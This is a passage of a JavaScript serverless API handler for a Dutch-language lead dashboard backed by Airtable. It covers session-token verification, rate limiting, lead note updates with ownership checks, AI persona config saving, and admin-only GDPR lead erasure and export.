const crypto = require('crypto');
const _gcal   = require('./_gcal');   // per-client Google Calendar (optional, fail-soft)
const credits = require('./_credits'); // credit/usage accounting — see its file header
const { getPlanState } = require('./_plan'); // trial/plan-status interpretation — pure, no I/O
const images  = require('./_images'); // Phase 4 AI property images — see its file header
const _lang   = require('./_lang');   // language registry — see its file header

// Single-shot Airtable fetch. No retries on 429.
//
// Root-cause (2026-05-14): multiple dashboard tabs each polling every 90 s,
// with 2-retry atFetch, generated 4–5 simultaneous Airtable calls and kept
// Airtable permanently rate-limited in a self-reinforcing cycle.
//
// Fix: one attempt only for everything.  On 429 → return immediately →
// serve stale cache (polling) or surface error (PATCH) → wait the natural
// interval before trying again.  No rapid retries that extend the ban.
async function atFetch(url, opts) {
  return fetch(url, opts);
}

// Client config cache by API key. 30 min TTL
// Legacy (pre-session-token) keys still hit Airtable on a cold instance;
// longer TTL means the warm-instance path covers far more polls before
// needing to refresh, reducing Airtable noise that competes with auth.js.
const _clientCache = new Map();
const CLIENT_TTL   = 30 * 60 * 1000;

// Leads response cache by projectCode.
// On Airtable 429, serves the last-known-good response so the dashboard
// stays populated instead of showing an error.  We always try Airtable
// first; the cache is only used when Airtable refuses (429) or errors.
// MAX_STALE_MS caps how old the stale data can be. After 1 hour we'd
// rather show an empty state than leads from yesterday.
const _leadsCache = new Map();
const MAX_STALE_MS = 60 * 60 * 1000; // 1 hour
function getCachedLeads(code) {
  return _leadsCache.get(code) || null; // { payload, ts }. caller checks freshness
}
function setCachedLeads(code, payload) {
  _leadsCache.set(code, { payload, ts: Date.now() });
}
function getCachedClient(key) {
  const e = _clientCache.get(key);
  if (!e) return null;
  if (Date.now() - e.ts > CLIENT_TTL) { _clientCache.delete(key); return null; }
  return e.record;
}
function setCachedClient(key, record) {
  _clientCache.set(key, { record, ts: Date.now() });
}

// Rate limiter. 120 req / 60s per IP (allows normal polling, blocks hammering)
const _rl = new Map();
function isRateLimited(ip, max = 120, windowMs = 60_000) {
  const now  = Date.now();
  const hits = (_rl.get(ip) || []).filter(t => now - t < windowMs);
  hits.push(now);
  _rl.set(ip, hits);
  if (_rl.size > 2000) { for (const [k, v] of _rl) if (!v.some(t => now - t < windowMs)) _rl.delete(k); }
  return hits.length > max;
}

// Per-tenant daily quota for the test-message mode (see below). Keyed by
// `${projectCode}:${YYYY-MM-DD}` so the counter naturally resets every day
// with no separate cleanup job needed — same day-bucket idea as the rest of
// this file's in-memory maps. Protects the shared platform WhatsApp number:
// without this, one client hammering test-message (their only backstop was
// the IP-based rate limiter) risks the shared number getting rate-limited or
// banned by Meta for every client on the platform.
const _testMsgCounts = new Map();
const TEST_MSG_DAILY_LIMIT = 10;
function isTestMessageQuotaExceeded(projectCode) {
  const day  = new Date().toISOString().slice(0, 10);
  const key  = `${projectCode}:${day}`;
  const next = (_testMsgCounts.get(key) || 0) + 1;
  _testMsgCounts.set(key, next);
  if (_testMsgCounts.size > 2000) {
    for (const k of _testMsgCounts.keys()) if (!k.endsWith(':' + day)) _testMsgCounts.delete(k);
  }
  return next > TEST_MSG_DAILY_LIMIT;
}

function safeEqual(a, b) {
  try {
    const ba = Buffer.from(String(a));
    const bb = Buffer.from(String(b));
    if (ba.length !== bb.length) return false;
    return crypto.timingSafeEqual(ba, bb);
  } catch { return false; }
}

function isAdminToken(provided, adminKey) {
  if (!adminKey || !provided) return false;
  const expected = crypto.createHmac('sha256', adminKey).update('helvaro-admin-v1').digest('hex');
  return safeEqual(provided, expected);
}

// ── Session token verification ─────────────────────────────────────────────────
// Tokens are signed by auth.js; verifying locally saves one Airtable call per
// request for every client. No env vars needed, works at any scale.
// Fail closed: never verify tokens with a known constant (see auth.js signingBase).
// A missing secret must reject sessions, not accept forged ones for any tenant.
function sessionSecret() {
  const base = process.env.SESSION_SECRET || process.env.ADMIN_KEY;
  if (!base) throw new Error('SESSION_SECRET (or ADMIN_KEY) is not configured — refusing to verify tokens with a default secret');
  return crypto.createHmac('sha256', base).update('helvaro-session-v1').digest('hex');
}
function verifySession(token) {
  if (typeof token !== 'string' || !token.startsWith('hvs1.')) return null;
  const parts = token.split('.');
  if (parts.length !== 3) return null;
  const [, payload, sig] = parts;
  if (!payload || !sig) return null;
  // sessionSecret() throwing here means the environment is misconfigured
  // (no SESSION_SECRET/ADMIN_KEY) — log it distinctly so it surfaces in
  // ops rather than looking like routine invalid-key traffic. Every request
  // still falls through to Path B (legacy key) and gets a normal 401;
  // nothing crashes.
  let secret;
  try {
    secret = sessionSecret();
  } catch (err) {
    console.error('[leads] session verification unavailable:', err.message);
    return null;
  }
  try {
    const expected = crypto.createHmac('sha256', secret).update(payload).digest('base64url');
    const a = Buffer.from(sig,      'base64url');
    const b = Buffer.from(expected, 'base64url');
    if (a.length !== b.length || !crypto.timingSafeEqual(a, b)) return null;
    const data = JSON.parse(Buffer.from(payload, 'base64url').toString('utf8'));
    // Fail closed: a token missing exp entirely must be rejected, not treated
    // as never-expiring. Every token minted by auth.js's signSession() always
    // sets exp, so a missing/invalid exp means a malformed or hand-crafted token.
    if (typeof data.exp !== 'number' || !isFinite(data.exp) || Date.now() > data.exp) return null;
    return data;
  } catch { return null; }
}

module.exports = async function handler(req, res) {
  res.setHeader('Access-Control-Allow-Origin', 'https://app.helvaro.pro');
  res.setHeader('Access-Control-Allow-Methods', 'GET, PATCH, POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type, x-api-key');

  if (req.method === 'OPTIONS') return res.status(200).end();

  // Google Calendar OAuth/connection is folded into this function to stay under
  // Vercel's serverless-function limit (no separate api/gcal.js — that caused a
  // deploy failure before, see api/_gcal.js's header comment). The public path
  // /api/gcal is rewritten here with __gcal=1 (see vercel.json), so the
  // registered Google redirect URI (/api/gcal?action=callback) never has to
  // change. Handle it before the leads auth flow / rate limiter — it has its
  // own auth (signed session or signed OAuth state) and must never be blocked
  // by IP rate limiting meant for the leads API.
  if (req.query && req.query.__gcal === '1') return handleGcal(req, res);

  // Vercel sets x-vercel-forwarded-for itself from the real edge connection and
  // strips/overwrites any client-supplied value, unlike x-forwarded-for, which
  // a client can set directly to spoof the rate-limit key. Fall back to
  // x-forwarded-for only when x-vercel-forwarded-for is absent (e.g. local dev
  // without the Vercel edge in front).
  const ip = req.headers['x-vercel-forwarded-for']?.split(',')[0]?.trim()
          || req.headers['x-forwarded-for']?.split(',')[0]?.trim()
          || 'unknown';
  if (isRateLimited(ip)) return res.status(429).json({ error: 'Te veel verzoeken. Probeer later opnieuw.' });

  const AIRTABLE_TOKEN = process.env.API_AIRTABLE;
  const BASE_ID        = process.env.BASE_AIRTABLE;
  const LEADS_TABLE    = 'tbliukTnDAbEDcZmt';
  const CLIENTS_TABLE  = 'tblPidTrwGRzRt4LZ';

  // ── Auth ────────────────────────────────────────────────────────────────────
  // Accept up to 2 KB to accommodate signed session tokens (~400 chars)
  const raw = String(req.headers['x-api-key'] || '').trim().slice(0, 2048);
  if (!raw) return res.status(401).json({ error: 'API key ontbreekt' });

  let projectCode = '', clientName = '', calendlyLink = '', isAdmin = false;

  // Path A: signed session token. Verify locally, zero Airtable calls
  const session = verifySession(raw);
  if (session) {
    projectCode  = session.projectCode  || '';
    clientName   = session.clientName   || '';
    calendlyLink = session.calendlyLink || '';
  } else {
    // Path B: legacy API key (admin derived token or old sessions before this deploy)
    if (!/^[A-Za-z0-9\-_]{8,100}$/.test(raw)) {
      return res.status(401).json({ error: 'Ongeldige API key' });
    }

    // Admin token. Timing-safe check against the derived token (not the raw key)
    if (isAdminToken(raw, process.env.ADMIN_KEY)) {
      // GET-only short-circuit: an admin session has no real client/lead data
      // of its own, so a GET (dashboard load) returns an empty-but-valid
      // payload. PATCH/POST must NOT silently no-op here — a PATCH (save
      // notes) or POST (send message) authenticated with an admin token used
      // to hit this same unconditional return, so the caller believed it
      // succeeded while nothing happened. Surface a clear error instead.
      if (req.method === 'GET') {
        return res.status(200).json({
          leads: [],
          stats: { total: 0, qualified: 0, booked: 0, conversionRate: 0, thisMonth: 0, avgResponseTime: 0 },
          client: { naam: 'Admin', calendly: '' }
        });
      }
      // Compliance fix (COMPLIANCE-AUDIT.md section 1.2, ported from the VPS
      // backend's server/routes/leads.js): the ONE exception to "admin-token
      // never touches lead data" above — admin-authenticated lead erasure/
      // export, so a data-subject-rights request (right to erasure/access,
      // GDPR Arts. 15-20, DPA clause 7.3) can be fulfilled through a scoped,
      // logged API call instead of an ad-hoc manual Airtable edit. Every
      // other POST/PATCH mode stays blocked below — admin has no per-tenant
      // identity to safely scope any OTHER write to.
      let peekBody = req.body;
      if (typeof peekBody === 'string') { try { peekBody = JSON.parse(peekBody); } catch { peekBody = {}; } }
      if (req.method === 'POST' && peekBody && (peekBody.mode === 'lead-delete' || peekBody.mode === 'lead-export')) {
        isAdmin = true;
      } else {
        return res.status(400).json({ error: 'Admin-token ondersteunt deze bewerking niet' });
      }
    }

    // Airtable Clients table lookup (with 5-min in-memory cache as last resort)
    try {
      let client = getCachedClient(raw);
      if (!client) {
        const formula = encodeURIComponent(`{API Key}="${escapeFormula(raw)}"`);
        const cRes    = await atFetch(
          `https://api.airtable.com/v0/${BASE_ID}/${CLIENTS_TABLE}?filterByFormula=${formula}&maxRecords=1`,
          { headers: { Authorization: `Bearer ${AIRTABLE_TOKEN}` } }
        );
        if (cRes.status === 429) {
          return res.status(503).json({ error: 'Systeem is druk. Probeer over 30 seconden opnieuw.' });
        }
        const cData = await cRes.json();
        if (!cData.records || cData.records.length === 0) {
          return res.status(401).json({ error: 'Ongeldige API key' });
        }
        client = cData.records[0];
        setCachedClient(raw, client);
      }
      projectCode  = client.fields['fldN4dL0bGgfBOXwM'] || client.fields['Project Code']  || '';
      clientName   = client.fields['fldAnB848Sr5jl6dq'] || client.fields['Client Name']   || '';
      calendlyLink = client.fields['fldNEj1ysRgINOOtr'] || client.fields['Calendly Link'] || '';
    } catch (err) {
      console.error('Leads auth error:', err.message);
      return res.status(500).json({ error: 'Database fout. Probeer later opnieuw.' });
    }
  }

  // ── PATCH. Save notes ──────────────────────────────────────────────────────
  if (req.method === 'PATCH') {
    try {
      const pqs     = (req.url || '').split('?')[1] || '';
      const pParams = new URLSearchParams(pqs);
      let recordId  = pParams.get('id') || '';

      // Fallback: last URL segment
      if (!recordId) {
        const p    = (req.url || '').split('?')[0].split('/').filter(Boolean);
        recordId   = p[p.length - 1] || '';
      }

      // Strict Airtable record ID format: rec + 14 alphanumeric chars
      if (!/^rec[A-Za-z0-9]{14}$/.test(recordId)) {
        return res.status(400).json({ error: 'Ongeldig record ID' });
      }

      let body = req.body;
      if (typeof body === 'string') { try { body = JSON.parse(body); } catch { body = {}; } }
      if (!body || typeof body !== 'object') body = {};

      const fields = {};
      if (body.notities !== undefined) fields['fldoLRI5W12ThTls7'] = String(body.notities).slice(0, 8000);
      if (body.status   !== undefined) {
        const allowed = ['new', 'in_progress', 'completed', 'verloren'];
        if (allowed.includes(body.status)) fields['fld8mkrEWcyq7mUip'] = body.status;
      }
      if (body.dealWaarde   !== undefined) fields['fldv7qOYvCN1xJfiR'] = String(body.dealWaarde).slice(0, 200);
      if (body.verliesReden !== undefined) {
        // Allowlist matches the exact <select> options in dashboard.js (lines 10020-10027)
        // Empty string clears the field; unknown values are silently ignored (defense in depth).
        const allowedRedenen = ['', 'Prijs te hoog', 'Geen timing', 'Concurrent gekozen', 'Geen interesse', 'Geen reactie', 'Andere reden'];
        const reden = String(body.verliesReden);
        if (allowedRedenen.includes(reden)) {
          fields['fld3NhSENma0okbT7'] = reden;
        }
        // Unknown values are silently dropped. The dashboard UI only sends known values;
        // an attacker injecting free text gets their payload ignored, which is exactly
        // what we want. Returning a 400 here would leak which values ARE valid.
      }
      if (Object.keys(fields).length === 0) return res.status(400).json({ error: 'Geen velden om bij te werken' });

      // SECURITY: verify the lead belongs to the authenticated client BEFORE
      // mutating. Without this, anyone with a valid session token could PATCH
      // any lead in the system as long as they knew/guessed the record ID.
      // Admin tokens bypass (already short-circuited earlier with empty leads).
      if (!projectCode) return res.status(403).json({ error: 'Geen client context' });
      try {
        const ownCheck = await atFetch(
          `https://api.airtable.com/v0/${BASE_ID}/${LEADS_TABLE}/${recordId}`,
          { headers: { Authorization: `Bearer ${AIRTABLE_TOKEN}` } }
        );
        if (!ownCheck.ok) return res.status(404).json({ error: 'Lead niet gevonden' });
        const ownData = await ownCheck.json();
        const ownProject = ownData.fields?.['fldSmczuyUJd26HLe'] || ownData.fields?.['Project Code'] || '';
        if (ownProject !== projectCode) {
          return res.status(403).json({ error: 'Geen toegang tot deze lead' });
        }
      } catch (err) {
        console.error('[leads PATCH] ownership check failed:', err.message);
        return res.status(500).json({ error: 'Server fout' });
      }

      const pRes  = await atFetch(
        `https://api.airtable.com/v0/${BASE_ID}/${LEADS_TABLE}/${recordId}`,
        {
          method:  'PATCH',
          headers: { Authorization: `Bearer ${AIRTABLE_TOKEN}`, 'Content-Type': 'application/json' },
          body:    JSON.stringify({ fields })
        }
      );
      const pData = await pRes.json();
      if (!pRes.ok) {
        console.error('Airtable PATCH error:', pRes.status);
        return res.status(500).json({ error: 'Opslaan mislukt. Probeer later opnieuw.' });
      }

      // ── Deal-closed email notification ──────────────────────────────────────
      if (body.dealWaarde) {
        const leadName = pData.fields?.['fldbk0LVNckOU0bqA'] || pData.fields?.['Name'] || '(onbekend)';
        sendResendEmail({
          subject: `Deal gesloten - ${escHtml(leadName)} (${escHtml(body.dealWaarde)})`,
          html: `
            <div style="font-family:sans-serif;max-width:480px;margin:auto">
              <h2 style="color:#16a34a">Deal gesloten</h2>
              <table style="width:100%;border-collapse:collapse">
                <tr><td style="padding:8px;color:#666">Lead</td><td style="padding:8px;font-weight:600">${escHtml(leadName)}</td></tr>
                <tr><td style="padding:8px;color:#666">Waarde</td><td style="padding:8px;font-weight:700;color:#16a34a">${escHtml(body.dealWaarde)}</td></tr>
                <tr><td style="padding:8px;color:#666">Client</td><td style="padding:8px">${escHtml(clientName)}</td></tr>
              </table>
              <a href="https://app.helvaro.pro/dashboard" style="display:inline-block;margin-top:16px;padding:10px 20px;background:#16a34a;color:#fff;border-radius:8px;text-decoration:none">Open Dashboard</a>
            </div>`
        }).catch(() => {});
      }

      return res.status(200).json(pData);
    } catch (err) {
      console.error('PATCH error:', err.message);
      return res.status(500).json({ error: 'Serverfout. Probeer later opnieuw.' });
    }
  }

  // ── POST handlers ──────────────────────────────────────────────────────────
  if (req.method === 'POST') {
    let body = req.body;
    if (typeof body === 'string') { try { body = JSON.parse(body); } catch { body = {}; } }
    if (!body || typeof body !== 'object') body = {};

    // ── A. Config-get / config-save (AI Persona settings page) ───────────────
    // Authenticated by the same session/api-key flow; only allows the client
    // to read/write THEIR own Klanten record. Whitelisted fields only.
    if (body.mode === 'config-get' || body.mode === 'config-save') {
      if (!projectCode) return res.status(403).json({ error: 'Geen client context' });
      try {
        // Look up the client's Klanten record by Project Code (field ID fldN4dL0bGgfBOXwM)
        const formula = encodeURIComponent(`{fldN4dL0bGgfBOXwM}="${escapeFormula(projectCode)}"`);
        const cRes = await atFetch(
          `https://api.airtable.com/v0/${BASE_ID}/${CLIENTS_TABLE}?filterByFormula=${formula}&maxRecords=1`,
          { headers: { Authorization: `Bearer ${AIRTABLE_TOKEN}` } }
        );
        if (!cRes.ok) return res.status(500).json({ error: 'Klant niet gevonden' });
        const cData = await cRes.json();
        const rec   = (cData.records || [])[0];
        if (!rec) return res.status(404).json({ error: 'Klantrecord niet gevonden' });

        // ── GET current config ──
        if (body.mode === 'config-get') {
          return res.status(200).json({
            aiName:         rec.fields['fldRvoe1JMPOtPWC7'] || rec.fields['AI Name']             || '',
            autoReplyTpl:   rec.fields['fldOGdVq6T54xEo6W'] || rec.fields['Auto-Reply Template'] || '',
            aiInstructions: rec.fields['fld1lqHctRbqFGQf5'] || rec.fields['AI Instructions']     || '',
            website:        rec.fields['fldzBclLhryWQ1veO'] || rec.fields['Website']             || '',
            address:        rec.fields['fldTvMSdTZOyNgWod'] || rec.fields['Adres']               || '',
            sector:         rec.fields['fld0BsPnDbBOkTHzr'] || rec.fields['Niche']               || '',
            calendlyLink:   rec.fields['fldNEj1ysRgINOOtr'] || rec.fields['Calendly Link']       || '',
            clientName:     rec.fields['fldAnB848Sr5jl6dq'] || rec.fields['Client Name']         || '',
            aiPhotoUrl:     rec.fields['fld7L0Iijq7ti6A6w'] || rec.fields['AI Photo URL']        || '',
            brandColor:     rec.fields['fldJAf4aTNlIQVL2q'] || rec.fields['Brand Color']         || '',
            formIntro:      rec.fields['fldxZ5spOeIb5omPr'] || rec.fields['Form Intro Message']  || '',
            language:       rec.fields['fld1iiV9XwSbgAACZ'] || rec.fields['Language']            || 'nl',
            // Opt-in "reply in the lead's own language" toggle. Field does
            // NOT exist on the Airtable schema yet (name: "Match Lead
            // Language", type: Checkbox) — reads as undefined -> false until
            // Sindi creates it, matching the "absent field = off" contract
            // this file already uses for every other config field.
            matchLeadLanguage: rec.fields['Match Lead Language'] === true,
            workingHours:   rec.fields['fldq5oIqw5MG8fKhc'] || rec.fields['Working Hours']       || '',
            trustBadges:    rec.fields['fld4nzMbnQseuGhnN'] || rec.fields['Trust Badges']        || '',
            bookingMethod:  (rec.fields['fldUI9BYO0TplgYlm'] || rec.fields['Booking Method'] || 'in_chat').toString().toLowerCase(),
            callbackWindow: rec.fields['fldKvMVBalSBRQE7H'] || rec.fields['Callback Window']     || '',
            notifyPhone:    rec.fields['fldZEApe0gfse07AU'] || rec.fields['Notify Phone']        || '',
            reportEmail:    rec.fields['fldDBJCN6dVMA8jax'] || rec.fields['Rapport Email']       || '',
            learnedPatterns: rec.fields['fldnbM5YKh274ISAl'] || rec.fields['AI Learned Patterns'] || ''
          });
        }

        // ── SAVE config (PATCH whitelisted fields only) ──
        const u = {};
        if (body.aiName         !== undefined) u.fldRvoe1JMPOtPWC7 = String(body.aiName).trim().slice(0, 60);
        if (body.autoReplyTpl   !== undefined) u.fldOGdVq6T54xEo6W = String(body.autoReplyTpl).trim().slice(0, 1000);
        if (body.aiInstructions !== undefined) u.fld1lqHctRbqFGQf5 = String(body.aiInstructions).trim().slice(0, 3000);
        if (body.website        !== undefined) u.fldzBclLhryWQ1veO = String(body.website).trim().slice(0, 500);
        if (body.address        !== undefined) u.fldTvMSdTZOyNgWod = String(body.address).trim().slice(0, 300);
        if (body.calendlyLink   !== undefined) u.fldNEj1ysRgINOOtr = String(body.calendlyLink).trim().slice(0, 500);
        // sector goes to Niche (singleSelect). typecast:true lets unknown values pass
        if (body.sector         !== undefined) u.fld0BsPnDbBOkTHzr = String(body.sector).trim().slice(0, 100);
        // Form personalization fields (shown on the lead form page)
        if (body.aiPhotoUrl     !== undefined) {
          // Allow EITHER an external https URL OR a self-hosted base64 data URL
          // (uploaded via the file picker in dashboard). Data URLs are capped at
          // 200 KB to keep Airtable cells reasonable and form-page HTML lean.
          const raw = String(body.aiPhotoUrl).trim();
          const isHttps = /^https:\/\//.test(raw);
          const isData  = /^data:image\/(png|jpe?g|webp);base64,[A-Za-z0-9+/=]+$/.test(raw);
          if (raw === '') {
            u.fld7L0Iijq7ti6A6w = '';
          } else if (isHttps && raw.length <= 500) {
            u.fld7L0Iijq7ti6A6w = raw;
          } else if (isData && raw.length <= 200 * 1024) {
            u.fld7L0Iijq7ti6A6w = raw;
          } else {
            // Unknown format / too big. Silently drop (don't error, just don't update)
            console.warn('[config-save] aiPhotoUrl rejected: invalid format or >200KB');
          }
        }
        if (body.brandColor     !== undefined) {
          const v = String(body.brandColor).trim().slice(0, 8);
          u.fldJAf4aTNlIQVL2q = (v === '' || /^#?[0-9a-fA-F]{6}$/.test(v)) ? v : '';
        }
        if (body.formIntro      !== undefined) u.fldxZ5spOeIb5omPr = String(body.formIntro).trim().slice(0, 600);
        if (body.language       !== undefined) {
          const v = String(body.language).trim().toLowerCase();
          if (_lang.isSupportedLanguage(v)) u.fld1iiV9XwSbgAACZ = v;
        }
        // "Match Lead Language" is handled as a SEPARATE best-effort PATCH
        // below (after the main save), deliberately NOT folded into `u`.
        // Airtable rejects an entire PATCH (all fields in it, atomically)
        // with a 422 if ANY field name in the payload doesn't exist in the
        // table schema yet — folding an as-yet-nonexistent field into the
        // same request as aiName/website/etc would break saving THOSE too
        // until Sindi creates the field. Keeping it isolated means the rest
        // of config-save keeps working perfectly today, and this one setting
        // silently no-ops (logged) until the field exists.
        const wantsMatchLeadLanguageUpdate = body.matchLeadLanguage !== undefined;
        if (body.workingHours   !== undefined) {
          // Lightweight format validation. Must match 'days hours' or be empty
          const v = String(body.workingHours).trim().toLowerCase().slice(0, 60);
          if (v === '' || /^[a-z]{3,9}\s*[-–]\s*[a-z]{3,9}\s+\d{1,2}(?::\d{2})?\s*[-–]\s*\d{1,2}(?::\d{2})?$/.test(v)) {
            u.fldq5oIqw5MG8fKhc = v;
          }
        }
        if (body.trustBadges    !== undefined) u.fld4nzMbnQseuGhnN = String(body.trustBadges).trim().slice(0, 300);
        if (body.bookingMethod  !== undefined) {
          const v = String(body.bookingMethod).trim().toLowerCase();
          // 'calendly' is deprecated. Behoud 'callback', accepteer nieuwe 'in_chat'
          if (v === 'in_chat' || v === 'callback' || v === 'calendly') u.fldUI9BYO0TplgYlm = v;
        }
        if (body.callbackWindow !== undefined) u.fldKvMVBalSBRQE7H = String(body.callbackWindow).trim().slice(0, 100);
        if (body.notifyPhone    !== undefined) {
          // Light phone validation. Must start with + or digits, allow spaces / dashes
          const v = String(body.notifyPhone).trim().slice(0, 30);
          if (v === '' || /^[+]?[0-9][0-9\s\-().]{6,29}$/.test(v)) u.fldZEApe0gfse07AU = v;
        }
        if (body.reportEmail    !== undefined) {
          const v = String(body.reportEmail).trim().slice(0, 100);
          if (v === '' || /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(v)) u.fldDBJCN6dVMA8jax = v;
        }
        // Klant kan zelf geleerde patronen wissen of bewerken (max 1500 chars)
        if (body.learnedPatterns !== undefined) {
          u.fldnbM5YKh274ISAl = String(body.learnedPatterns).slice(0, 1500);
        }
        if (Object.keys(u).length === 0 && !wantsMatchLeadLanguageUpdate) {
          return res.status(400).json({ error: 'Niets om bij te werken' });
        }

        if (Object.keys(u).length > 0) {
          const upRes = await atFetch(
            `https://api.airtable.com/v0/${BASE_ID}/${CLIENTS_TABLE}/${rec.id}`,
            {
              method:  'PATCH',
              headers: { Authorization: `Bearer ${AIRTABLE_TOKEN}`, 'Content-Type': 'application/json' },
              body:    JSON.stringify({ fields: u, typecast: true })
            }
          );
          if (!upRes.ok) {
            const txt = await upRes.text().catch(() => '');
            console.error('[config-save] update failed', upRes.status, txt.slice(0, 300));
            return res.status(500).json({ error: 'Opslaan mislukt' });
          }
          // Invalidate the client cache so the next leads fetch sees fresh values
          try { setCachedClient(raw, { ...rec, fields: { ...rec.fields, ...u } }); } catch {}
        }

        // "Match Lead Language" — separate, best-effort PATCH (see the
        // wantsMatchLeadLanguageUpdate comment above for why it's isolated
        // from `u`). Deliberately does NOT fail the request if the field
        // doesn't exist on the schema yet: this is a nice-to-have opt-in
        // setting, not core config, and the main fields above (which DID
        // exist) already saved successfully by this point.
        if (wantsMatchLeadLanguageUpdate) {
          try {
            const mlRes = await atFetch(
              `https://api.airtable.com/v0/${BASE_ID}/${CLIENTS_TABLE}/${rec.id}`,
              {
                method:  'PATCH',
                headers: { Authorization: `Bearer ${AIRTABLE_TOKEN}`, 'Content-Type': 'application/json' },
                body:    JSON.stringify({ fields: { 'Match Lead Language': body.matchLeadLanguage === true }, typecast: true })
              }
            );
            if (!mlRes.ok) {
              const txt = await mlRes.text().catch(() => '');
              console.warn('[config-save] "Match Lead Language" niet opgeslagen (veld bestaat waarschijnlijk nog niet in Airtable — zie api/_lang.js voor de spec):', mlRes.status, txt.slice(0, 200));
            }
          } catch (err) {
            console.warn('[config-save] "Match Lead Language" PATCH exception:', err.message);
          }
        }

        return res.status(200).json({ ok: true });
      } catch (err) {
        console.error('[config] error:', err.message);
        return res.status(500).json({ error: 'Serverfout' });
      }
    }

    // ── A1b. lead-delete — admin-authenticated erasure of ONE lead (GDPR
    // Arts. 17/20, docs/verwerkersovereenkomst-DPA.md clause 7.3). Ported
    // from the VPS backend's server/routes/leads.js (see COMPLIANCE-AUDIT.md
    // section 1.2). Only reachable by an admin token — `isAdmin` is set ONLY
    // in the auth block above, and only when the caller both authenticated
    // with the admin-derived token AND explicitly requested this mode. A
    // regular client session's own token never carries isAdmin, so it 403s
    // here like any other actor without admin rights.
    //
    // Admin has no tenant context of its own (projectCode is '' for the
    // admin path), so the target tenant is named explicitly in the body
    // (`projectCode`) and cross-checked against the lead's TRUE owner
    // (fetched fresh from Airtable) before anything is touched — same
    // 404-vs-403 ownership-check pattern used by every other mutation in
    // this file.
    //
    // `method`: 'anonymize' (DEFAULT — scrubs PII, keeps the record + every
    // aggregate/analytics field so a client's dashboard stats don't change
    // shape just because one lead was erased) or 'hard-delete' (removes the
    // Airtable record entirely).
    //
    // Erasure audit log: Airtable has no append-only log table for this
    // (unlike the VPS's erasure_log table) and adding one is a schema change
    // to the live base that's the owner's call, not this batch's — see
    // VERCEL-DEPLOY-CHECKLIST.md's "known gaps" section. Every erasure/
    // export is instead logged clearly to console with a `[erasure]` prefix
    // (id, projectCode, action, actor, timestamp) as an interim durable-ish
    // record (Vercel function logs).
    if (body.mode === 'lead-delete') {
      if (!isAdmin) return res.status(403).json({ error: 'Alleen admin kan een lead verwijderen/anonimiseren' });
      const id = String(body.id || '').trim();
      if (!/^rec[A-Za-z0-9]{14}$/.test(id)) return res.status(400).json({ error: 'Ongeldig lead ID' });
      const targetProjectCode = String(body.projectCode || '').trim();
      if (!targetProjectCode) return res.status(400).json({ error: 'projectCode ontbreekt' });
      const method = body.method === 'hard-delete' ? 'hard-delete' : 'anonymize';

      try {
        const ownCheck = await atFetch(
          `https://api.airtable.com/v0/${BASE_ID}/${LEADS_TABLE}/${id}`,
          { headers: { Authorization: `Bearer ${AIRTABLE_TOKEN}` } }
        );
        if (!ownCheck.ok) return res.status(404).json({ error: 'Lead niet gevonden' });
        const existing = await ownCheck.json();
        const ownProject = existing.fields?.['fldSmczuyUJd26HLe'] || existing.fields?.['Project Code'] || '';
        if (ownProject !== targetProjectCode) {
          return res.status(403).json({ error: 'Lead behoort niet tot de opgegeven projectCode' });
        }

        if (method === 'hard-delete') {
          const delRes = await atFetch(
            `https://api.airtable.com/v0/${BASE_ID}/${LEADS_TABLE}/${id}`,
            { method: 'DELETE', headers: { Authorization: `Bearer ${AIRTABLE_TOKEN}` } }
          );
          if (!delRes.ok) {
            const t = await delRes.text().catch(() => '');
            console.error('[erasure] hard-delete failed', delRes.status, t.slice(0, 300));
            return res.status(500).json({ error: 'Verwijderen mislukt' });
          }
          console.log(`[erasure] action=delete id=${id} projectCode=${targetProjectCode} actor=admin ts=${new Date().toISOString()}`);
          return res.status(200).json({ ok: true, method: 'hard-delete', id });
        }

        // anonymize (default): overwrite ONLY the columns that hold the
        // lead's identity or raw conversation content. Every aggregate/
        // analytics field (Qualified, Lead Score, Ability/Urgency/Fit,
        // Conversation State, Booking Link Sent, Appointment Booked, Bron,
        // Verwachte Waarde, Response Time, Reason, Opgepikt, Created At) is
        // DELIBERATELY left untouched — same rationale as the VPS's
        // anonymizeLead() in server/db/index.js. Phone uses `null` (clears
        // the field); the rest use '' — Airtable accepts either to clear a
        // text/longtext field, matching how this file already clears optional
        // text fields elsewhere (e.g. config-save's aiPhotoUrl `''` case).
        const anonFields = {
          fldbk0LVNckOU0bqA: '[verwijderd]',      // Name
          fld6YaitW0lMqHUrd: null,                 // Phone
          'Conversation History': JSON.stringify([]),
          'Last Message': '',
          fldqerIiw5qyQjXHr: '',                   // AI Summary
          fldoLRI5W12ThTls7: '',                   // Notities
        };
        const anonRes = await atFetch(
          `https://api.airtable.com/v0/${BASE_ID}/${LEADS_TABLE}/${id}`,
          {
            method:  'PATCH',
            headers: { Authorization: `Bearer ${AIRTABLE_TOKEN}`, 'Content-Type': 'application/json' },
            body:    JSON.stringify({ fields: anonFields })
          }
        );
        if (!anonRes.ok) {
          const t = await anonRes.text().catch(() => '');
          console.error('[erasure] anonymize failed', anonRes.status, t.slice(0, 300));
          return res.status(500).json({ error: 'Anonimiseren mislukt' });
        }
        const anonData = await anonRes.json();
        console.log(`[erasure] action=anonymize id=${id} projectCode=${targetProjectCode} actor=admin ts=${new Date().toISOString()}`);
        return res.status(200).json({ ok: true, method: 'anonymize', record: anonData });
      } catch (err) {
        console.error('[leads] lead-delete error:', err.message);
        return res.status(500).json({ error: 'Serverfout' });
      }
    }

    // ── A1c. lead-export — admin-authenticated single-lead data-portability
    // dump (GDPR Arts. 15/20). Same admin-only + explicit-projectCode +
    // ownership-check-then-scoped-fetch pattern as lead-delete above. Still
    // logged (action=export) even though nothing is mutated, so there's a
    // console record of when a lead's data was accessed and by whom (see
    // lead-delete's comment above on the erasure-log-is-console-only gap).
    if (body.mode === 'lead-export') {
      if (!isAdmin) return res.status(403).json({ error: 'Alleen admin kan een lead exporteren' });
      const id = String(body.id || '').trim();
      if (!/^rec[A-Za-z0-9]{14}$/.test(id)) return res.status(400).json({ error: 'Ongeldig lead ID' });
      const targetProjectCode = String(body.projectCode || '').trim();
      if (!targetProjectCode) return res.status(400).json({ error: 'projectCode ontbreekt' });

      try {
        const r = await atFetch(
          `https://api.airtable.com/v0/${BASE_ID}/${LEADS_TABLE}/${id}`,
          { headers: { Authorization: `Bearer ${AIRTABLE_TOKEN}` } }
        );
        if (!r.ok) return res.status(404).json({ error: 'Lead niet gevonden' });
        const record = await r.json();
        const ownProject = record.fields?.['fldSmczuyUJd26HLe'] || record.fields?.['Project Code'] || '';
